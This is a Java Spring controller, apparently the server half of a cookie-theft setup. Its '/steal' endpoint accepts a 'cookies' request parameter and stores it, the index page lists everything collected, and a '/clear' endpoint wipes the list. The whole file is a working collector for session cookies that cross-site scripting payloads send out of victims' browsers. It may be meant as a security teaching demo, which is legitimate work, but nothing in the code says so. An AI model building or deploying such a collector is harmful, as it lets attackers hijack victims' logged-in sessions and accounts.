package fr.jerep6.evil.controller;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;

import fr.jerep6.evil.model.EvilCookie;

@Controller
public class ControllerCookie {

  private List<EvilCookie> cookies = new ArrayList<>();

  @RequestMapping(value = "/", method = RequestMethod.GET)
  public String index(Model model) {

    model.addAttribute("cookies", cookies);
    return "cookie";
  }

  @RequestMapping(value = "/steal", method = RequestMethod.GET)
  public @ResponseBody HashMap<String, String> steal(Model model,
      @RequestParam(value = "cookies", required = false) String rawCookies) {
    cookies.add(new EvilCookie(rawCookies));

    model.addAttribute("cookies", cookies);

    HashMap<String, String> hashMap = new HashMap<String, String>();
    hashMap.put("result", "cookies enregistrés");
    return hashMap;
  }

  @RequestMapping(value = "/clear", method = RequestMethod.GET)
  public @ResponseBody HashMap<String, String> clear(Model model) {
    cookies.clear();

    HashMap<String, String> hashMap = new HashMap<String, String>();
    hashMap.put("result", "clear success");
    return hashMap;
  }
}
